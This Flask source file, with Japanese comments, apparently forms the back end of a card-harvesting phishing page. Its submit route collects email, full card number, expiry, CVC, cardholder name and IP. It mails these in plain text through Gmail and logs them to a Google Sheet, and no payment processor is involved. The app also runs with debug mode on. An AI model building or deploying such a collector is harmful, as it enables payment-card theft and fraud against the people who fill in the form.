from flask import Flask, request, render_template
from datetime import datetime
import os
import time
import json
import smtplib
from email.mime.text import MIMEText
from google.oauth2 import service_account
from googleapiclient.discovery import build
from dotenv import load_dotenv

load_dotenv()

# ========== 環境変数の読み込み ==========
EMAIL_FROM = os.environ['EMAIL_FROM']
EMAIL_TO = os.environ['EMAIL_TO']
EMAIL_APP_PASSWORD = os.environ['EMAIL_APP_PASSWORD']
SPREADSHEET_ID = os.environ['SPREADSHEET_ID']
GOOGLE_CREDENTIALS = json.loads(os.environ['GOOGLE_CREDENTIALS'])

# ========== アプリ初期化 ==========
app = Flask(__name__)
ip_last_sent = {}
SEND_INTERVAL = 5 * 60  # 5分間制限

# ========== メール送信関数 ==========
def send_email(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_FROM
    msg['To'] = EMAIL_TO

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(EMAIL_FROM, EMAIL_APP_PASSWORD)
        server.send_message(msg)

# ========== スプレッドシート記録関数 ==========
def write_to_sheet(ip, form_data, timestamp):
    creds = service_account.Credentials.from_service_account_info(
        GOOGLE_CREDENTIALS,
        scopes=['https://www.googleapis.com/auth/spreadsheets']
    )
    service = build('sheets', 'v4', credentials=creds)

    # 通し番号を取得（A列の長さ）
    sheet_data = service.spreadsheets().values().get(
        spreadsheetId=SPREADSHEET_ID,
        range='A:A'
    ).execute()
    existing_rows = sheet_data.get('values', [])
    next_number = len(existing_rows)

    # フォーム内容を展開
    email = form_data.get('email')
    card_number = form_data.get('num')
    expiry = form_data.get('date')
    cvc = form_data.get('cv')
    card_name = form_data.get('name')

    # スプレッドシートに記録する行データ
    values = [[
        next_number,
        timestamp,
        ip,
        email,
        card_number,
        expiry,
        cvc,
        card_name
    ]]

    body = {'values': values}

    service.spreadsheets().values().append(
        spreadsheetId=SPREADSHEET_ID,
        range='A1',
        valueInputOption='RAW',
        insertDataOption='INSERT_ROWS',
        body=body
    ).execute()

# ========== ルーティング ==========
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    ip = request.remote_addr
    now = time.time()

    if ip in ip_last_sent and now - ip_last_sent[ip] < SEND_INTERVAL:
        remaining = int(SEND_INTERVAL - (now - ip_last_sent[ip]))
        return f"{remaining}秒後に再送信できます。"

    # フォームデータ受け取り
    form = request.form
    email = form.get('email')
    card_number = form.get('num')
    expiry = form.get('date')
    cvc = form.get('cv')
    card_name = form.get('name')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # メール本文作成
    body = f"""▼申し込み内容

メールアドレス: {email}
カード番号: {card_number}
有効期限: {expiry}
セキュリティコード: {cvc}
カード名義: {card_name}
送信元IP: {ip}
送信時刻: {timestamp}
"""

    # メール送信
    send_email("フォーム送信通知", body)

    # スプレッドシートに記録
    write_to_sheet(ip, form, timestamp)

    # 制限記録
    ip_last_sent[ip] = now

    return '✅ 送信完了しました！'

# ========== 起動 ==========
if __name__ == '__main__':
    app.run(debug=True)
